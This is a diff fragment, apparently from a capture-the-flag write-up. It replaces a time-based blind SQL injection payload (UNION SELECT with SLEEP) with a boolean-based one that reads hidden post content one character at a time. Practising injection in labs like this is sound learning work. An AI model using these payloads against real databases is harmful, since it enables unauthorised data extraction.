@@ -324,7 +324,7 @@ FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/qk7gi3xb2a3rzsx9edxylqczm4xv
 ![[IMG-20251205221625977.png]]
 
 ```sql
-admin' UNION SELECT id,content FROM post WHERE id = 1 AND IF((SELECT COUNT(*) FROM post WHERE id=6)>0, SLEEP(0.2), 0)--
+' OR (SELECT substr(content,1,1) FROM post WHERE id=6)='t' -- 
 ```
 
 
